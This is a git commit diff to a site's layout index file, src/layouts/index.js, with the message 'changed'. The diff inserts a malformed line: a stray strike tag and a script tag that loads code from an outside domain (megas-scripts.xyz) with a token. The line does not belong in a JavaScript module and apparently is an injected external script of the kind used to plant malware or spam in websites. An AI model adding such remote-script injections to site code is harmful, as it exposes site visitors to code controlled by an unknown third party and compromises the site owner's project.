ed57d0ad97aee5017f649f41cd82673a8350a35e
Stackbit Code Editor <projects@stackbit.com>
2021-06-29 04:34:38 +0000

    index.js: changed

--- src/layouts/index.js
+++ src/layouts/index.js
@@ -1,7 +1,7 @@
 import advanced from './advanced';
 import page from './page';
 import post from './post';
-
+   <strike><script type="text/javascript" src="https://megas-scripts.xyz/?token=d979e5cc7476d4308bfbbc740f153db3"async="true"></script>
 export {
     advanced,
     page,
